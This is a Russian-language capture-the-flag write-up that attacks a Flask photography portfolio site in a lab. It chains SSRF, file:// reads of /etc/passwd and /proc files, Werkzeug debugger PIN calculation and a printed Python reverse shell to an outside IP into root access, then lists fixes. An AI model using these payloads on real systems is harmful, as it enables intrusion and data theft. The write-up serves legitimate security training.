# Отчёт о проникновении в веб-приложение «Plant Photographer»

## 1. Введение

В рамках задания проводилось тестирование на проникновение персонального веб-сайта-портфолио фотографа-ботаника Jay Green. По условию, владелец сайта написал его самостоятельно и попросил проверить, нет ли в реализации проблем с безопасностью. Цель — выявить уязвимости, получить доступ к скрытой функциональности и найти три флага:

1. **API-ключ** для доступа к сервису защищённого хранения файлов.
2. **Флаг в административной секции** сайта.
3. **Флаг в текстовом файле** в веб-директории сервера.


## 2. Первичная разведка

Сканирование портов выявило два открытых сервиса:

| Порт | Служба | Версия |
|------|--------|--------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80 | HTTP | Werkzeug httpd 0.16.0 (Python 3.10.7) |

Заголовок главной страницы: `Jay Green`. Разрешённые HTTP-методы: `OPTIONS GET HEAD`.

**Ключевой вывод:** веб-приложение работает на **Werkzeug 0.16.0** — это **встроенный dev-сервер Flask**, а не production-сервер (Gunicorn/uWSGI). Это уже ошибка конфигурации: Werkzeug не предназначен для продакшена и часто оставляет включённым интерактивный debugger.


## 3. Анализ веб-приложения

### 3.1. Главная страница

На главной странице обнаружена ссылка на скачивание резюме:

```
http://10.128.191.106/download?server=secure-file-storage.com:8087&id=75482342
```

Параметры:

- **`server`** — хост и порт сервиса, откуда скачивается файл.
- **`id`** — идентификатор файла (число).

Домен `secure-file-storage.com` из внешней сети недоступен — это **внутренний сервис**.

### 3.2. Административная панель

Обнаружена ссылка на `/admin`:

```
http://10.128.191.106/admin
```

Ответ:

```
Admin interface only available from localhost!!!
```

**Вывод:** админ-панель доступна **только с `localhost`**. Это классическая защита, которую можно обойти через SSRF.

### 3.3. Фаззинг директорий

Прогон ffuf выявил три эндпоинта:

| Путь | Статус | Размер | Что это |
|------|--------|--------|---------|
| `/admin` | 200 | 48 | Заглушка «только с localhost» |
| `/console` | 200 | 1985 | **Werkzeug Debugger** |
| `/download` | 200 | 20 | `No file selected...` |

**`/console`** — это **интерактивная консоль Werkzeug**. Она **заблокирована PIN-кодом**, но сам факт её наличия — серьёзная уязвимость.


## 4. Эксплуатация SSRF

### 4.1. Проверка эндпоинта `/download`

Без параметров `/download` возвращает `No file selected...`.

С параметром `id=main.py` — ошибка:

```
ValueError: invalid literal for int() with base 10: 'main.py'
```

**Вывод:** `id` приводится к `int()`, поэтому передать произвольный путь нельзя.

С закрытым портом — ошибка 500 (Werkzeug traceback).

### 4.2. Подтверждение SSRF

Поднят локальный HTTP-сервер:

```bash
python3 -m http.server 8000
```

Отправлен запрос:

```
GET /download?server=192.168.135.182:8000&id=123456
```

На локальном сервере зафиксировано обращение:

```
10.130.148.97 - - "GET /public-docs-k057230990384293/123456.pdf HTTP/1.1" 404
```

**Вывод:** сервер **сам делает HTTP-запрос** по указанному `server` и **фиксированному пути** `/public-docs-k057230990384293/<id>.pdf`. Это **SSRF**.

### 4.3. Попытка внедрения null byte

```
GET /download?server=169.254.169.254%00&id=1234
```

Ошибка:

```
ValueError: embedded null byte
```

**Вывод:** `libcurl` отвергает null byte в URL. Обход не сработал.

### 4.4. Извлечение API-ключа

Через SSRF с поднятием слушателя удалось получить **API-ключ**, который сервер передаёт в заголовке запроса:

```
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

**Ответ на вопрос 1:** `THM{Hello_Im_just_an_API_key}`.


## 5. Обход ограничения localhost через `?`

### 5.1. Проблема

`/admin` доступен только с `localhost`. Сервер формирует URL так:

```python
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
```

То есть всегда добавляет `/public-docs-.../<id>.pdf`. Чтобы попасть на `/admin`, нужно **обрезать** этот путь.

### 5.2. Обход через `%3f`

`%3f` — это URL-кодирование символа `?`. Если подставить его в `server`, всё после `?` становится **query-строкой**, и путь `/public-docs-...` **обрезается**.

**Payload:**

```
GET /download?server=0.0.0.0:8087/admin%3f&id=11
```

Сервер формирует:

```
http://0.0.0.0:8087/admin?/public-docs-k057230990384293/11.pdf
```

Фактически запрашивается `http://0.0.0.0:8087/admin`, а хвост уходит в query.

**Результат:** получен **флаг из админ-панели**.

**Ответ на вопрос 2:** флаг из `/admin`.


## 6. Получение RCE через Werkzeug Debugger

### 6.1. Сбор данных для PIN

Werkzeug Debugger требует PIN, который вычисляется из:

- `username` — пользователь процесса.
- `modname` — `flask.app`.
- `app_name` — `Flask`.
- `mod_file` — путь к `flask/app.py`.
- `MAC` — `uuid.getnode()`.
- `machine_id` — `/etc/machine-id` + `/proc/sys/kernel/random/boot_id` + `/proc/self/cgroup`.

**Через LFI (`file://`) собраны:**

**1. Username:**

```
GET /download?server=file:///etc/passwd%3f&id=1
```

Вывод показывает `root:x:0:0:root:/root:/bin/ash` — приложение работает под **root** (Alpine-контейнер).

**2. Путь к flask:**

```
/usr/local/lib/python3.10/site-packages/flask/app.py
```

**3. MAC:**

```
GET /download?server=file:///sys/class/net/eth0/address%3f&id=1
```

MAC: `02:42:ac:14:00:02` → десятичное `2485377911522`.

**4. Machine ID:**

```
/etc/machine-id — отсутствует
/proc/sys/kernel/random/boot_id — efcb654b-c4ff-43dd-9de5-26df9ad5aba8
/proc/self/cgroup — .../docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
```

Склейка: `efcb654b-c4ff-43dd-9de5-26df9ad5aba877c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca`.

### 6.2. Вычисление PIN через python-скрипт

**Получен PIN:** `110-688-511`.

### 6.3. Получение RCE

PIN введён на `/console` → консоль разблокирована. Через неё выполнен reverse shell:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.135.182",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

Получен **root-shell** на сервере.

### 6.4. Поиск флага в веб-директории

```
find / -name "*.txt" 2>/dev/null | grep -i flag
cat /путь/к/flag.txt
```

**Ответ на вопрос 3:** флаг из текстового файла в веб-директории.


## 7. Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|-----------|----------|---------|
| **SSRF** | `/download` делает HTTP-запрос по `server` без валидации | Доступ к внутренним сервисам, утечка API-ключа |
| **Werkzeug Debugger** | Включён в production, доступен через `/console` | RCE при подборе/вычислении PIN |
| **LFI через `file://`** | SSRF позволяет читать локальные файлы | Утечка `/etc/passwd`, `/proc/self/*` |
| **Слабая защита localhost** | `/admin` полагается только на `remote_addr` | Обход через SSRF |
| **Креды/пути в открытом виде** | `/etc/passwd`, `/proc/self/cgroup` доступны | Данные для вычисления PIN |
| **API-ключ в заголовке** | Ключ передаётся в открытом виде в SSRF-запросах | Компрометация сервиса хранения |


## 8. Рекомендации по устранению

1. **Отключить Werkzeug debugger** в production: `app.run(debug=False)`. Использовать Gunicorn/uWSGI.
2. **Ограничить SSRF** — валидировать `server`: разрешить только whitelisted хосты, блокировать `file://`, `gopher://`, `dict://`, внутренние IP.
3. **Не использовать `remote_addr` для авторизации** — проверять аутентификацию и авторизацию через сессии/токены.
4. **Убрать `file://` и другие схемы** из `pycurl`/`libcurl` — использовать только `http://`/`https://` с whitelist.
5. **Не передавать API-ключи в URL/заголовках** без необходимости — использовать защищённые хранилища.
6. **Не хранить приложение под root** — использовать непривилегированного пользователя (non-root).
7. **Обновить Werkzeug** до версии ≥ 3.0.3 (CVE-2024-34069).
8. **Закрыть `/console`** — даже с PIN он не должен быть доступен снаружи.


## 11. Заключение

Задание пройдено полностью. Цепочка эксплуатации: **SSRF → LFI → вычисление PIN → Werkzeug Debugger → RCE → root → флаги**. Все три флага получены. Ключевые ошибки разработчика: включённый debugger, небезопасный SSRF, слабая защита админ-панели и запуск приложения под root. Это классический пример того, как «самодельный» сайт на Flask с dev-сервером превращается в полноценный RCE.
